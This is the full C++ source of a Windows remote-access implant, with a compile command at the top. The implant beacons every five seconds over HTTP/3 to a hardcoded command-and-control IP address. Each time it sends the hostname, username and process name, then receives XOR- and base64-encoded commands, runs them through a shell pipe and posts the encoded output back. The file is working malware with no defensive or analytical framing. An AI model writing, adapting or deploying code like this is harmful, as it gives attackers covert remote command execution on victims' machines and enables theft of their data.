// compile with : x86_64-w64-mingw32-g++ -static -O2 -std=c++11 -mconsole -o agent_quic.exe quic_agent.cpp

#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <sstream>
#include <exception>
#define UNLEN 127




const std::string XOR_KEY = "mysecretkey";
const std::string hostname = "217.154.13.193";
const int port = 443;
const std::string user_agent = "Mozilla/5.0";
const std::string path_api = "/api";
const int beacon_interval = 5;






static const std::string b64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string base64_encode(const std::string &in) {
    std::string out;
    int val = 0, valb = -6;
    for (uint8_t c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(b64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(b64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}
std::string base64_decode(const std::string &in) {
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[b64_chars[i]] = i;
    std::string out;
    int val = 0, valb = -8;
    for (uint8_t c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}
std::string xor_data(const std::string &data, const std::string &key) {
    std::string out = data;
    size_t klen = key.length();
    for (size_t i = 0; i < out.size(); ++i)
        out[i] ^= key[i % klen];
    return out;
}
std::string get_hostname() {
    char hostname[MAX_PATH] = { 0 };
    DWORD size = sizeof(hostname);
    if (GetComputerNameA(hostname, &size))
        return hostname;
    return "unknown_host";
}
std::string get_username() {
    char username[UNLEN + 1] = { 0 };
    DWORD size = UNLEN + 1;
    if (GetUserNameA(username, &size))
        return username;
    return "unknown_user";
}
std::string get_process_name() {
    char proc_name[MAX_PATH] = { 0 };
    if (GetModuleFileNameA(NULL, proc_name, MAX_PATH)) {
        std::string s(proc_name);
        size_t pos = s.find_last_of("\\/");
        if (pos != std::string::npos) return s.substr(pos + 1);
        return s;
    }
    return "unknown_process";
}
std::string generate_agent_id() {
    return get_hostname() + "_" + get_username() + "_" + get_process_name();
}

// Parseur naïf (strip "tasks": ["....",...] avec guillemets doubles) 
std::vector<std::string> parse_tasks(const std::string& json) {
    std::vector<std::string> res;
    size_t p = json.find("\"tasks\"");
    if (p == std::string::npos) return res;
    p = json.find('[', p);
    if (p == std::string::npos) return res;
    size_t q = json.find(']', p);
    if (q == std::string::npos) return res;
    std::string arr = json.substr(p + 1, q - p - 1);
    size_t start = 0, end;
    while ((end = arr.find('"', start)) != std::string::npos) {
        size_t s = end + 1;
        end = arr.find('"', s);
        if (end == std::string::npos) break;
        res.push_back(arr.substr(s, end - s));
        start = end + 1;
    }
    return res;
}

// Utilitaire : exécution de commande système
std::string exec_cmd(const std::string& cmd) {
    std::string result;
    char buffer[512];
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "Error opening pipe";
    while (fgets(buffer, sizeof(buffer), pipe) != NULL)
        result += buffer;
    _pclose(pipe);
    return result;
}

// Appelle curl.exe pour un POST/GET HTTP3 et récupère la stdout
std::string curl_http_post(const std::string& url, const std::string& json_body) {
    // Pour éviter les problèmes d'échappement sur Windows,
    // on écrit le body JSON dans un fichier temporaire à poster ensuite.
    char tmpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    char tmpFile[MAX_PATH];
    GetTempFileNameA(tmpPath, "JSON", 0, tmpFile);

    FILE* f = fopen(tmpFile, "w");
    if (f) {
        fwrite(json_body.c_str(), 1, json_body.size(), f);
        fclose(f);
    }
    std::string cmd = "curl.exe --http3 -k -s -H \"Content-Type: application/json\" -X POST --data-binary \"@" + std::string(tmpFile) + "\" \"" + url + "\"";
    std::string response;
    char buffer[512];
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        remove(tmpFile);
        return "";
    }
    while (fgets(buffer, sizeof(buffer), pipe)) response += buffer;
    _pclose(pipe);
    remove(tmpFile);
    return response;
}

bool curl_http_post_noreply(const std::string& url, const std::string& json_body) {
    char tmpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    char tmpFile[MAX_PATH];
    GetTempFileNameA(tmpPath, "JSON", 0, tmpFile);

    FILE* f = fopen(tmpFile, "w");
    if (f) {
        fwrite(json_body.c_str(), 1, json_body.size(), f);
        fclose(f);
    }
    std::string cmd = "curl.exe --http3 -k -s -H \"Content-Type: application/json\" -X POST --data-binary \"@" + std::string(tmpFile) + "\" \"" + url + "\"";
    int rc = system(cmd.c_str());
    remove(tmpFile);
    return (rc == 0);
}

int main() {
    std::setvbuf(stdout, NULL, _IONBF, 0);

    
    std::string agent_id = generate_agent_id();

    std::string url_api = "https://" + hostname + path_api;

    while (true) {
        // Collecte infos système et s’identifie pour obtenir les commandes à exécuter
        std::ostringstream post_info;
        post_info << "{";
        post_info << "\"agent_id\":\"" << agent_id << "\"";
        post_info << ",\"hostname\":\"" << get_hostname() << "\"";
        post_info << ",\"username\":\"" << get_username() << "\"";
        post_info << ",\"process_name\":\"" << get_process_name() << "\"";
        post_info << "}";

        std::string response = curl_http_post(url_api, post_info.str());

        // Parsing et déchiffrement des tâches du backend
        auto cmds = parse_tasks(response);

        for (const std::string& cmd_b64 : cmds) {
            std::string decoded = base64_decode(cmd_b64);
            std::string cmd = xor_data(decoded, XOR_KEY);
            std::string output;
            bool cmd_success = true;

            try {
                output = exec_cmd(cmd);
            } catch (const std::exception& e) {
                output = std::string("[!] Exception: ") + e.what();
                std::cout << "[!] Exception lors de l'exécution de la commande: " << e.what() << std::endl;
                cmd_success = false;
            } catch (...) {
                output = "[!] Erreur inconnue lors de l'exécution";
                std::cout << "[!] Erreur inconnue lors de l'exécution de la commande !" << std::endl;
                cmd_success = false;
            }

            try {
                std::string xor_result = xor_data(output, XOR_KEY);
                std::string result_b64 = base64_encode(xor_result);

                std::ostringstream ss;
                ss << "{";
                ss << "\"agent_id\":\"" << agent_id << "\"";
                ss << ",\"result\":\"";
                ss << result_b64;
                ss << "\"}";
                std::string result_json = ss.str();
                std::string url_push = "https://" + hostname + "/agent/" + agent_id + "/push_result";
                bool ok = curl_http_post_noreply(url_push, result_json);
                if (!ok) {
                    std::cout << "[!] POST du résultat au C2 a échoué !" << std::endl;
                }
            } catch (const std::exception& e) {
                std::cout << "[!] Exception lors de la construction ou POST du JSON résultat : " << e.what() << std::endl;
            } catch (...) {
                std::cout << "[!] Erreur inconnue durant la construction/POST JSON résultat !" << std::endl;
            }
        }

        std::this_thread::sleep_for(std::chrono::seconds(beacon_interval));
    }
    return 0;
}
